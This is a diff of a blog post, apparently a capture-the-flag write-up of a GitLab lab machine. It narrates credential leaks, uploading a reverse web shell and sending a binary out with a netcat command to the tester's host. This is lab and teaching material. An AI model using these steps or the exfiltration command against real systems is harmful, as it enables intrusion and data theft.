@@ -49,27 +49,27 @@ Now I'll run ```gobuster``` against the URL:
 
 While that runs through I'll start to manually parse through the site and see if there are any glaring hints. This will usually include, checking default passwords, source code and looking up the platform that is running.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-80.png" >}}
+![](/images/2019/10/image-80.png)
 
 The ```gobuster``` results show 5 potential locations. We browse through each and notice nothing particularly useful. However, if you continue to manually enumerate the page you will see there is a ```bookmarks.html``` link under the help section. When we follow this through we see there is an obfuscated JS function.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-81.png" >}}
+![](/images/2019/10/image-81.png)
 
 When we de-obfuscate the function we get the following:
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-82.png" >}}
+![](/images/2019/10/image-82.png)
 
 It looks like an attempt to make an auto login type function. By passing the ```username``` clave and ```password``` of 11des0081x to the gitlab page. So we manually try these credentials and they work!
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-83.png" >}}
+![](/images/2019/10/image-83.png)
 
 Now that we have an authenticated. We can continue to look around the page to see what might be of use. At this point in the enumeration we have also run a ```searchsploit``` on gitlab to see what might be out there. We do see there are a few options, one of which might be promising. We will continue to sift through the commits. The ```index.php``` file has some execution happening on it which we might be able to leverage. We also see some interesting code under the snippets location. A username and password for the postrgres connector. We also have the admins profile page. We have the ability to create files and merge them. So this will be easy, we'll just upload a webshell, merge the branch and go to the page we've just created.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-84.png" >}}
+![](/images/2019/10/image-84.png)
 
 We use the standard ```pentest monkey``` reverse web shell upload it, start our ```netcat``` listener, merge the branch and navigate to the page. Next thing you know we have a webshell.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-85.png" >}}
+![](/images/2019/10/image-85.png)
 
 We try to snag the ```user.txt``` but run into a permissions issue. So we'll start enumerating with some standard tools, ```linenum``` and ```pspy64```. We fire up our ```SimpleHTTPServer``` and download what we need. While that runs we take a look at what we can run as a privileged user. We have the ability to ```git pull```. We also see that we are in a docker container, so we'll want to try an enumerate the other portion of the systems. As it turns out nmap is on the system and we have the ability to run it.
 
@@ -124,15 +124,15 @@ PORT     STATE SERVICE
 
 Now we've got a fairly good idea of the landscape. Lets focus on gaining user. If we circle back around to the enumeration we did previously, we can try to leverage the hidden snippet we found. When we look at it, we see that it's making a database connection but that's it. So once the connection is made, we can just output the rows. We then create this file and merge the branch.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-87.png" >}}
+![](/images/2019/10/image-87.png)
 
 Once we've merged the branch, we head over to the page name and see what results come back.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-86.png" >}}
+![](/images/2019/10/image-86.png)
 
 Looks like we get a username and a ```base64``` encrypted password. We decode it and get ```ssh-str0ng-p@ss```. So either this entire string is the password or some combination of it is the ```ssh``` password. So when I try to ```ssh``` into the box as the user, I keep getting denied. So is this possibly not the right password? As the ```www-data user```, we try to change users to clave. We have the ability to but we don't seem to have the right password. Maybe the password is the hash, we are doing CTF's ;). Sure enough, the password was the hash and not the decrypted content.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-88.png" >}}
+![](/images/2019/10/image-88.png)
 
 Now that we're are loggin in as clave, we snag our user.txt and move onto root. In Clave's home directory we have a binary called ```RemoteConnection.exe```. Now often Remote Connection tools can save credentials inside. So we'll transfer the binary back to our system start to reverse engineer it. So we set up a ```netcat``` listener on our machine. We then send the file on the remote machine: ```nc -w 3 10.10.15.236 1999 < RemoteConnection.exe```. Once we've received the file we can start to break it down.
 
@@ -140,15 +140,15 @@ We'll use [Ollydbg](http://www.ollydbg.de/) as our debugger to see what it may s
 
 We'll load the application into Olly. Initially stepping into the application looking for the entry point that we can enter data to our application. We set a few breakpoints on those and start stepping in. We are able to quickly find what we are looking for:
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-89.png" >}}
+![](/images/2019/10/image-89.png)
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-90.png" >}}
+![](/images/2019/10/image-90.png)
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-91.png" >}}
+![](/images/2019/10/image-91.png)
 
 We have a root password here! Let's see if it works.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-92.png" >}}
+![](/images/2019/10/image-92.png)
 
 It does indeed. Root flag captured! Overall a pretty easy box. I know that some people I spoke to said that you could go right from the low privileged shell to root using ```git pull```. There are multiple paths to root on this box. This is just how I did mine!
 
